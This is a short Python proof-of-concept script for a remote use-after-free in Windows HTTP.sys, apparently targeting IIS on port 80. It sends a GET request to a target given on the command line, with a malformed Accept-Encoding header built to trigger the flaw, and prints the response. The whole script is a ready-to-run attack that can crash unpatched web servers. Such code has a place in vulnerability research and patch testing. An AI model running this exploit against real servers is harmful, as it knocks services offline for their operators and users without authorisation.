import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for IIS_80_Port: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()
